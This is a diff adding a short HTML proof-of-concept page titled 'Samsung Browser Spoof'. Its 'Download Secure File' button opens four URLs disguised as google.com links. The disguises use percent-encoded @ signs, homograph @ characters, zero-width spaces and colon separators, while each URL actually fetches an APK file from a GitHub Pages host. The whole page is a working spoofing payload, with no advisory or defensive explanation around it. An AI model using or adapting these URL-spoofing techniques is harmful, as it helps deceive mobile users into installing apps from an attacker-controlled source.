@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Samsung Browser Spoof</title>
+</head>
+<body>
+    <button onclick="advancedSpoof()">Download Secure File</button>
+
+    <script>
+        function advancedSpoof() {
+            // Technique 1: Mixed encoding
+            const url1 = "https://google.com%40%40%40ryynx88.github.io/chy.apk";
+            
+            // Technique 2: Unicode homographs
+            const url2 = "https://google.com﹫﹫﹫ryynx88.github.io/chy.apk";
+            
+            // Technique 3: Zero-width characters
+            const url3 = "https://google.com\u200B@\u200B@\u200B@ryynx88.github.io/chy.apk";
+            
+            // Technique 4: Mixed separators
+            const url4 = "https://google.com:@:@ryynx88.github.io/chy.apk";
+            
+            // Try multiple techniques
+            const urls = [url1, url2, url3, url4];
+            
+            urls.forEach((url, index) => {
+                setTimeout(() => {
+                    try {
+                        window.open(url, `frame${index}`);
+                    } catch(e) {
+                        console.log(`Technique ${index+1} failed:`, e);
+                    }
+                }, index * 1000);
+            });
+        }
+    </script>
+</body>
+</html>
